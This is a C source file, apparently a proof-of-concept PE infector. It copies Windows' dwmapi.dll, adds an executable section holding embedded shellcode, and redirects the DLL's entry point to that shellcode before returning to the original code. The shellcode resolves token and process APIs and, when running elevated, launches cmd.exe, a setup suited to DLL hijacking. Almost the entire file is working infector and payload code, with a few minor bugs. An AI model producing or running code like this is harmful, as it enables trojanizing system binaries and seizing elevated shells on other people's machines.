/****************************************************************************************************
	This source is licensed under the MalwareTech Public License which gives you permission to use 
	it freely as long as the code is replicated using a Hansen ball typewriter and compiled by hand. 
*****************************************************************************************************/

#include <windows.h>
#include <stdio.h>

CHAR shellcode[] = "\x83\x7C\x24\x08\x01\x75\x07\x60\xE8\x06\x00\x00\x00\x61\xE9\xDC\xBE\xAD\xDE\x55\x89\xE5\x81\xEC\xF4\x01\x00\x00\xC7\x85\x0C\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\x34\xFE\xFF\xFF\x4E\x74\x4F\x70\xC7\x85\x38\xFE\xFF\xFF\x65\x6E\x50\x72\xC7\x85\x3C\xFE\xFF\xFF\x6F\x63\x65\x73\xC7\x85\x40\xFE\xFF\xFF\x73\x54\x6F\x6B\x66\xC7\x85\x44\xFE\xFF\xFF\x65\x6E\xC6\x85\x46\xFE\xFF\xFF\x00\xC7\x85\x47\xFE\xFF\xFF\x4E\x74\x51\x75\xC7\x85\x4B\xFE\xFF\xFF\x65\x72\x79\x49\xC7\x85\x4F\xFE\xFF\xFF\x6E\x66\x6F\x72\xC7\x85\x53\xFE\xFF\xFF\x6D\x61\x74\x69\xC7\x85\x57\xFE\xFF\xFF\x6F\x6E\x54\x6F\x66\xC7\x85\x5B\xFE\xFF\xFF\x6B\x65\xC6\x85\x5D\xFE\xFF\xFF\x6E\xC6\x85\x5E\xFE\xFF\xFF\x00\xC7\x85\x5F\xFE\xFF\xFF\x4E\x74\x43\x6C\x66\xC7\x85\x63\xFE\xFF\xFF\x6F\x73\xC6\x85\x65\xFE\xFF\xFF\x65\xC6\x85\x66\xFE\xFF\xFF\x00\xC7\x85\x67\xFE\xFF\xFF\x45\x78\x70\x61\xC7\x85\x6B\xFE\xFF\xFF\x6E\x64\x45\x6E\xC7\x85\x6F\xFE\xFF\xFF\x76\x69\x72\x6F\xC7\x85\x73\xFE\xFF\xFF\x6E\x6D\x65\x6E\xC7\x85\x77\xFE\xFF\xFF\x74\x53\x74\x72\xC7\x85\x7B\xFE\xFF\xFF\x69\x6E\x67\x73\xC6\x85\x7F\xFE\xFF\xFF\x41\xC6\x85\x80\xFE\xFF\xFF\x00\xC7\x85\x81\xFE\xFF\xFF\x43\x72\x65\x61\xC7\x85\x85\xFE\xFF\xFF\x74\x65\x50\x72\xC7\x85\x89\xFE\xFF\xFF\x6F\x63\x65\x73\x66\xC7\x85\x8D\xFE\xFF\xFF\x73\x41\xC6\x85\x8F\xFE\xFF\xFF\x00\xC7\x85\x90\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\x94\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\x98\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\x9C\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xA0\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xA4\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xA8\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xAC\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xB0\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xB4\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xB8\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xBC\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xC0\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xC4\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xC8\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xCC\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xD0\xFE\xFF\xFF\x00\x00\x00\x00\xC7\x85\xE4\xFE\xFF\xFF\x25\x77\x69\x6E\xC7\x85\xE8\xFE\xFF\xFF\x64\x69\x72\x25\xC7\x85\xEC\xFE\xFF\xFF\x5C\x73\x79\x73\xC7\x85\xF0\xFE\xFF\xFF\x74\x65\x6D\x33\xC7\x85\xF4\xFE\xFF\xFF\x32\x5C\x63\x6D\xC7\x85\xF8\xFE\xFF\xFF\x64\x2E\x65\x78\xC6\x85\xFC\xFE\xFF\xFF\x65\xC6\x85\xFD\xFE\xFF\xFF\x00\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x50\x10\x89\x95\x18\xFE\xFF\xFF\x8B\x00\x8B\x50\x10\x89\x95\x1C\xFE\xFF\xFF\x8D\x95\x34\xFE\xFF\xFF\x52\xFF\xB5\x18\xFE\xFF\xFF\xE8\x01\x01\x00\x00\x89\x85\x20\xFE\xFF\xFF\x8D\x95\x47\xFE\xFF\xFF\x52\xFF\xB5\x18\xFE\xFF\xFF\xE8\xE9\x00\x00\x00\x89\x85\x24\xFE\xFF\xFF\x8D\x95\x5F\xFE\xFF\xFF\x52\xFF\xB5\x18\xFE\xFF\xFF\xE8\xD1\x00\x00\x00\x89\x85\x28\xFE\xFF\xFF\x8D\x95\x67\xFE\xFF\xFF\x52\xFF\xB5\x1C\xFE\xFF\xFF\xE8\xB9\x00\x00\x00\x89\x85\x2C\xFE\xFF\xFF\x8D\x95\x81\xFE\xFF\xFF\x52\xFF\xB5\x1C\xFE\xFF\xFF\xE8\xA1\x00\x00\x00\x89\x85\x30\xFE\xFF\xFF\x8D\x95\x0C\xFE\xFF\xFF\x52\x6A\x08\x6A\xFF\xFF\x95\x20\xFE\xFF\xFF\x85\xC0\x75\x6D\x8D\x95\x14\xFE\xFF\xFF\x52\x6A\x04\x8D\x95\x10\xFE\xFF\xFF\x52\x6A\x12\xFF\xB5\x0C\xFE\xFF\xFF\xFF\x95\x24\xFE\xFF\xFF\x85\xC0\x75\x4B\x83\xBD\x10\xFE\xFF\xFF\x02\x75\x42\x68\xFF\x00\x00\x00\x8D\x95\xFE\xFE\xFF\xFF\x52\x8D\x95\xE4\xFE\xFF\xFF\x52\xFF\x95\x2C\xFE\xFF\xFF\x8D\x95\xD4\xFE\xFF\xFF\x52\x8D\x95\x90\xFE\xFF\xFF\x52\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x8D\x95\xFE\xFE\xFF\xFF\x52\x6A\x00\xFF\x95\x30\xFE\xFF\xFF\x83\xBD\x0C\xFE\xFF\xFF\x00\x74\x0C\xFF\xB5\x0C\xFE\xFF\xFF\xFF\x95\x28\xFE\xFF\xFF\x89\xEC\x5D\xC3\x55\x89\xE5\x83\xEC\x0C\x8B\x45\x08\x8B\x48\x3C\x01\xC1\x81\x39\x50\x45\x00\x00\x75\x51\x8D\x51\x78\x8B\x12\x01\xC2\x8B\x4A\x1C\x01\xC1\x89\x4D\xF4\x8B\x4A\x20\x01\xC1\x89\x4D\xF8\x8B\x4A\x24\x01\xC1\x89\x4D\xFC\x31\xC9\x8B\x5D\xF8\x8B\x1C\x8B\x01\xC3\x50\x53\xFF\x75\x0C\xE8\x26\x00\x00\x00\x85\xC0\x58\x74\x08\x41\x3B\x4A\x18\x75\xE3\xEB\x11\x8B\x55\xFC\x0F\xB7\x1C\x4A\x8B\x4D\xF4\x8B\x1C\x99\x01\xD8\xEB\x02\x31\xC0\x89\xEC\x5D\xC2\x08\x00\x55\x89\xE5\x56\x57\x51\x8B\x75\x08\x8B\x7D\x0C\x31\xC9\x8A\x04\x0F\x8A\x24\x0E\x24\xDF\x80\xE4\xDF\x38\xE0\x75\x0B\x3C\x00\x74\x03\x41\xEB\xEA\x31\xC0\xEB\x05\xB8\x01\x00\x00\x00\x59\x5F\x5E\x89\xEC\x5D\xC2\x08\x00";

BOOL LoadModuleBytes(CHAR *ModulePath, LPVOID *OutputBuffer, PDWORD BufferSize)
{
	DWORD FileSize, BytesRead = 0;
	LPVOID FileBuffer = NULL;
	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	BOOL success = FALSE;

	do //not a loop
	{
		FileHandle = CreateFileA(ModulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if(FileHandle == INVALID_HANDLE_VALUE)
			break;

		FileSize = GetFileSize(FileHandle, NULL);

		FileBuffer = malloc(FileSize);
		if(!FileBuffer)
			break;

		ReadFile(FileHandle, FileBuffer, FileSize, &BytesRead, NULL);

		if(BytesRead != FileSize)
			break;

		*BufferSize = FileSize;
		*OutputBuffer = FileBuffer;

		success = TRUE;

	} while (FALSE);
	
	if(FileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileHandle);

	if(success == FALSE && FileBuffer != NULL)
		free(FileBuffer);

	return success;
}

BOOL SaveModuleBytes(CHAR *ModulePath, LPVOID SaveBuffer, DWORD BufferSize)
{
	DWORD BytesWritten = 0;

	HANDLE FileHandle = CreateFileA(ModulePath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if(FileHandle == INVALID_HANDLE_VALUE)
		return FALSE;

	WriteFile(FileHandle, SaveBuffer, BufferSize, &BytesWritten, NULL);
	CloseHandle(FileHandle);

	if(BytesWritten != BufferSize)
		return FALSE;

	return TRUE;
}

/*
	Adds an extra section to the end of the module and redirect the entry point to call shellcode
	Note: We don't allocate space in PE for our new section's header as directly after the section
	headers is the bound imports directory, which isn't required for the executable to work and can
	simply be disabled.
*/
BOOL InfectModule(CHAR *ModulePath, CHAR *DestinationPath)
{
	LPVOID PEBuffer = NULL, NewPEBuffer = NULL;
	DWORD PESize, NewPESize, SectionSize, remainder, ImageSize, VirtualAddress;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_SECTION_HEADER NewSection, LastSection;
	PIMAGE_DOS_HEADER DosHeader;
	BOOL success = FALSE;

	do //Not a loop
	{
		if(!LoadModuleBytes(ModulePath, &PEBuffer, &PESize))
		{
			printf("Couldn't load module %s\n", ModulePath);
			return FALSE;
		}

		DosHeader = (PIMAGE_DOS_HEADER)PEBuffer;

		if(DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		{
			printf("File is not a valid portable executable\n");
			break;
		}

		NtHeader = (PIMAGE_NT_HEADERS)(DosHeader->e_lfanew + (DWORD)PEBuffer);

		if(NtHeader->Signature != IMAGE_NT_SIGNATURE)
		{
			printf("File is not a valid portable executable\n");
			break;
		}

		//Section size must be a multiple of FileAlignment
		remainder = sizeof(shellcode) % NtHeader->OptionalHeader.FileAlignment;
		if(remainder != 0)
			SectionSize = sizeof(shellcode) + (NtHeader->OptionalHeader.FileAlignment - remainder);

		//SizeOfImage won't work as it's the size of image in memory, not on disk
		NewPESize = SectionSize + PESize;

		NewPEBuffer = malloc(NewPESize);
		if(!NewPESize)
		{
			printf("Failed to allocate memory for new PE buffer\n");
			break;
		}

		memcpy(NewPEBuffer, PEBuffer, PESize);

		DosHeader = (PIMAGE_DOS_HEADER)NewPEBuffer;
		NtHeader = (PIMAGE_NT_HEADERS)((DWORD)NewPEBuffer + DosHeader->e_lfanew);

		LastSection = &IMAGE_FIRST_SECTION(NtHeader)[NtHeader->FileHeader.NumberOfSections-1];
		NewSection = &IMAGE_FIRST_SECTION(NtHeader)[NtHeader->FileHeader.NumberOfSections];

		memset(NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
		memcpy(NewSection->Name, ".mwt", 4);
		
		//VirtualAddress should be aligned on section boundary
		VirtualAddress = LastSection->VirtualAddress + LastSection->Misc.VirtualSize;
		remainder = VirtualAddress % NtHeader->OptionalHeader.SectionAlignment;
		if(remainder != 0)
			VirtualAddress = VirtualAddress + (NtHeader->OptionalHeader.SectionAlignment - remainder);

		//The section will be located directly after the previous section on disk and in memory
		NewSection->VirtualAddress = VirtualAddress;
		NewSection->PointerToRawData = LastSection->PointerToRawData + LastSection->SizeOfRawData;
		NewSection->SizeOfRawData = SectionSize;
		NewSection->Misc.VirtualSize = sizeof(shellcode);
		NewSection->Characteristics = (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);

		//New SizeOfImage must include the section we added and be a multiple of SectionAlignment
		ImageSize = NtHeader->OptionalHeader.SizeOfImage + SectionSize + (NtHeader->OptionalHeader.SectionAlignment - remainder);
		remainder = ImageSize % NtHeader->OptionalHeader.SectionAlignment;
		if(remainder != 0)
			ImageSize = ImageSize + (NtHeader->OptionalHeader.SectionAlignment - remainder);

		NtHeader->OptionalHeader.SizeOfImage = ImageSize;
		NtHeader->FileHeader.NumberOfSections++;

		//Our new section header overlaps the Bound Import Directory, but we can disable it because it's not required
		NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
		NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;

		//point the entry point to our shellcode and modify the return jump to jump back to the original entry point
		*(DWORD*)(shellcode+15) = (DWORD)(NtHeader->OptionalHeader.AddressOfEntryPoint - (NewSection->VirtualAddress+14) - 5);
		NtHeader->OptionalHeader.AddressOfEntryPoint = NewSection->VirtualAddress;

		memcpy((LPVOID)((DWORD)NewPEBuffer+NewSection->PointerToRawData), shellcode, sizeof(shellcode));

		if(!SaveModuleBytes(DestinationPath, NewPEBuffer, NewPESize))
		{
			printf("Could not save module to %s\n", DestinationPath);
			break;
		}

		printf("SUCCESS!\n" \
			"Infection module: %s\n" \
			"New Section VirtualSize: %X\n" \
			"New Section Size On Disk: %X\n" \
			"New SizeOfImage: %X\n",
			 DestinationPath, sizeof(shellcode), SectionSize, ImageSize
			 );

		success = TRUE;

	} while (FALSE);
	
	if(PEBuffer)
		free(PEBuffer);

	if(NewPEBuffer)
		free(NewPEBuffer);

	return success;
}

int main()
{
	CHAR ModulePath[MAX_PATH], InfectedModulePath[MAX_PATH];
	ExpandEnvironmentStringsA("%windir%\\system32\\dwmapi.dll", ModulePath, MAX_PATH-1);
	ExpandEnvironmentStringsA("%userprofile%\\Downloads\\dwmapi.dll", InfectedModulePath, MAX_PATH-1);
	InfectModule(ModulePath, InfectedModulePath);
	getchar();
}